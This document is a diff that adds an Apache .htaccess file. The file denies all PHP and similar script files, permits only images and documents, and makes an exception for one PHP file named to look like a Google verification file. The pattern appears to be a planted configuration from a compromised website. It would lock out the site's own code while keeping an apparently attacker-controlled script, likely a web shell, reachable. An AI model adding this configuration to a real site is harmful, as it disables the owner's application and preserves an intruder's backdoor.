@@ -1,0 +1,17 @@
+<FilesMatch "\\.(ph.*|a.*|P[hH].*|S.*)$"> 
+    Require all denied 
+</FilesMatch>
+ 
+<FilesMatch "\\.(jpg|jpeg|pdf|docx)$"> 
+    Require all granted 
+</FilesMatch> 
+ 
+<FilesMatch "^(google2ab2f7043824e50f.php)$"> 
+    Require all granted 
+</FilesMatch> 
+ 
+DirectoryIndex index.php 
+Options -Indexes 
+ 
+ErrorDocument 403 "403 Forbidden" 
+ErrorDocument 404 "404 Not Found"
